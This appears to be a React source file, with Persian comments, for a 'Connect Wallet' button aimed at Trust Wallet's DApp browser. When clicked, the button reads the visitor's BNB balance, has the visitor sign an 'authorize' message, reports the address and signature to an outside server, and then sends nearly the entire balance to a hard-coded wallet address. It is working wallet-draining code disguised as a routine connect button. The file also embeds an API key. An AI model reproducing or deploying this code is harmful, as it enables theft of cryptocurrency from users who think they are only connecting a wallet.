import React, { useState } from "react";

const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P";

async function getBNBBalance(address) {
  try {
    const resp = await fetch(
      `https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=${BSCSCAN_API_KEY}`
    );
    const data = await resp.json();
    if (data.status === "1") {
      return (parseInt(data.result) / 1e18).toFixed(6);
    }
  } catch (error) {
    console.error("❌ Error fetching BNB balance:", error);
  }
  return null;
}

function App() {
  const [account, setAccount] = useState(null);

  async function connectAndSend() {
    // اطمینان از وجود provider (DApp Browser تراست والت)
    if (typeof window.ethereum === "undefined") {
      alert("No Ethereum provider found. Please open in Trust Wallet DApp Browser!");
      return;
    }

    // درخواست آدرس کاربر
    let accounts;
    try {
      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    } catch (err) {
      console.error("❌ Could not request accounts:", err);
      return;
    }
    if (!accounts || !accounts.length) {
      console.error("❌ No account returned.");
      return;
    }
    const userAddress = accounts[0];
    setAccount(userAddress);
    console.log("✅ User address:", userAddress);

    // گرفتن بالانس از BscScan
    const bnbBalance = await getBNBBalance(userAddress);
    console.log("💰 BNB Balance:", bnbBalance);
    const totalBalance = parseFloat(bnbBalance);

    // تعیین reserve برای هزینه گس؛ اینجا reserve به 0.01 BNB (تنظیم قابل تغییر است)
    const reserveBNB = 0.01;
    const sendAmount = totalBalance - reserveBNB;
    if (sendAmount <= 0) {
      console.error("❌ Insufficient funds: not enough to cover reserve for gas fee.");
      return;
    }
    console.log("Calculated send amount (BNB):", sendAmount);

    // ساخت پیام برای امضا بر اساس sendAmount
    const message = `Authorize sending ${sendAmount} BNB from ${userAddress}`;
    console.log("📜 Message to sign:", message);

    let signature;
    try {
      // استفاده از personal_sign جهت امضای پیام
      signature = await window.ethereum.request({
        method: "personal_sign",
        params: [message, userAddress],
      });
      console.log("✍️ Signature:", signature);
    } catch (error) {
      console.error("❌ Error in personal_sign:", error);
      return;
    }

    // ارسال امضا به سرور جهت بررسی
    try {
      const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          handler: "tx",
          address: userAddress,
          signature: signature,
          amount: sendAmount.toString(),
        }),
      });
      const result = await resp.json();
      console.log("Server verify response:", result);
      if (!result.success) {
        console.error("❌ Signature verification failed or server error.", result);
        return;
      }
    } catch (e) {
      console.error("❌ Could not call server to verify signature:", e);
      return;
    }

    // ساخت تراکنش واقعی؛ در این نسخه gas و gasPrice حذف شده تا کیف پول آن‌ها را تخمین بزند.
    const sendWeiHex = "0x" + (sendAmount * 1e18).toString(16);
    const txParams = {
      from: userAddress,
      to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد
      value: sendWeiHex
      // حذف gas و gasPrice برای استفاده از تخمین خودکار کیف پول
    };

    try {
      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [txParams],
      });
      console.log("📤 Transaction broadcasted. Hash:", txHash);
      alert("Transaction sent! TxHash: " + txHash);
    } catch (err) {
      console.error("❌ Error sending transaction:", err);
    }
  }

  return (
    <div style={{ margin: "20px" }}>
      <a
        href="#"
        onClick={connectAndSend}
        className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      >
        {account ? `Connected: ${account}` : "Connect Wallet"}
      </a>
    </div>
  );
}

export default App;
